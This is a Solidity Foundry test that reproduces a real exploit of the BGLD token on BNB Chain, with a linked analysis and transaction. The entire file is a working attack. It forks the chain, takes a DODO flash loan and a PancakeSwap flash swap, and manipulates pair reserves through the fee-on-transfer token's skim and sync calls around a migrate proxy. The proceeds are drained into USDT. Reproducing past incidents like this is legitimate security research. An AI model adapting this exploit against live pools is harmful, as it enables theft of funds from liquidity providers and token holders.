// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @Analysis
// https://twitter.com/BlockSecTeam/status/1602335214356660225
// @TX
// https://bscscan.com/tx/0xea108fe94bfc9a71bb3e4dee4a1b0fd47572e6ad6aba8b2155ac44861be628ae

interface ERCPorxy {
    function migrate() external;
}

contract ContractTest is Test {
    IERC20 WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    IERC20 USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IERC20 oldBGLD = IERC20(0xC2319E87280c64e2557a51Cb324713Dd8d1410a3);
    IERC20 newBGLD = IERC20(0x169f715CaE1F94C203366a6890053E817C767B7C);
    IERC20 DEBT = IERC20(0xC632F90affeC7121120275610BF17Df9963F181c);
    Uni_Router_V2 Router = Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    ERCPorxy Proxy = ERCPorxy(0xE445654F3797c5Ee36406dBe88FBAA0DfbdDB2Bb);
    address dodo = 0x0fe261aeE0d1C4DFdDee4102E82Dd425999065F4;
    Uni_Pair_V2 WBNB_oldBGLD = Uni_Pair_V2(0x7526cC9121Ba716CeC288AF155D110587e55Df8b);
    Uni_Pair_V2 oldBGLD_DEBT = Uni_Pair_V2(0x429339fa7A2f2979657B25ed49D64d4b98a2050d);
    Uni_Pair_V2 newBGLD_DEBT = Uni_Pair_V2(0x559D0deAcAD259d970f65bE611f93fCCD1C44261);

    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() public {
        cheats.createSelectFork("bsc", 23_844_529);
    }

    function testExploit() public {
        oldBGLD.approve(address(Router), type(uint256).max);
        oldBGLD.approve(address(Proxy), type(uint256).max);
        newBGLD.approve(address(Router), type(uint256).max);
        DEBT.approve(address(Router), type(uint256).max);
        DVM(dodo).flashLoan(125 * 1e18, 0, address(this), new bytes(1)); // FlashLoan WBNB
        Proxy.migrate(); // migrate oldBGLD to newBGLD
        newBGLDToDEBT();
        newBGLD_DEBT.swap(0, 950 * 1e9, address(this), new bytes(1)); // FlashLoan DEBT
        Proxy.migrate();
        newBGLDToDEBT();
        DEBTToUSDT();

        emit log_named_decimal_uint("[End] Attacker USDT balance after exploit", USDT.balanceOf(address(this)), 18);

        emit log_named_decimal_uint("[End] Attacker WBNB balance after exploit", WBNB.balanceOf(address(this)), 18);
    }

    function DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external {
        WBNB.transfer(address(WBNB_oldBGLD), WBNB.balanceOf(address(this)));
        address[] memory path = new address[](2);
        path[0] = address(WBNB);
        path[1] = address(oldBGLD);
        uint256[] memory values = Router.getAmountsOut(125 * 1e18, path);
        WBNB_oldBGLD.swap(0, values[1] * 90 / 100, address(this), "");
        oldBGLD.transfer(address(WBNB_oldBGLD), oldBGLD.balanceOf(address(WBNB_oldBGLD)) * 10 + 10);
        WBNB_oldBGLD.skim(address(this));
        WBNB_oldBGLD.sync();
        oldBGLDToWBNB();
        WBNB.transfer(dodo, 125 * 1e18);
    }

    function pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
        DEBT.transfer(address(oldBGLD_DEBT), DEBT.balanceOf(address(this)));
        (uint256 oldBGLDreserve, uint256 DEBTreserve,) = oldBGLD_DEBT.getReserves();
        uint256 amountIn = DEBT.balanceOf(address(oldBGLD_DEBT)) - DEBTreserve;
        uint256 amountOut = amountIn * 9975 * oldBGLDreserve / (DEBTreserve * 10_000 + amountIn * 9975);
        oldBGLD_DEBT.swap(amountOut * 90 / 100, 0, address(this), "");
        oldBGLD.transfer(address(oldBGLD_DEBT), oldBGLD.balanceOf(address(oldBGLD_DEBT)) * 10 + 10);
        oldBGLD_DEBT.skim(address(this));
        oldBGLD_DEBT.sync();
        oldBGLDToDEBT();
        uint256 loanAmount = 950 * 1e9;
        DEBT.transfer(address(newBGLD_DEBT), loanAmount * 10_000 / 9975 + 1000);
    }

    function oldBGLDToWBNB() internal {
        address[] memory path = new address[](2);
        path[0] = address(oldBGLD);
        path[1] = address(WBNB);
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(100 * 1e6, 0, path, address(this), block.timestamp);
    }

    function newBGLDToDEBT() internal {
        address[] memory path = new address[](2);
        path[0] = address(newBGLD);
        path[1] = address(DEBT);
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            newBGLD.balanceOf(address(this)) * 90 / 100, 0, path, address(this), block.timestamp
        );
    }

    function oldBGLDToDEBT() internal {
        address[] memory path = new address[](2);
        path[0] = address(oldBGLD);
        path[1] = address(DEBT);
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(100 * 1e6, 0, path, address(this), block.timestamp);
    }

    function DEBTToUSDT() internal {
        address[] memory path = new address[](2);
        path[0] = address(DEBT);
        path[1] = address(USDT);
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            DEBT.balanceOf(address(this)), 0, path, address(this), block.timestamp
        );
    }
}
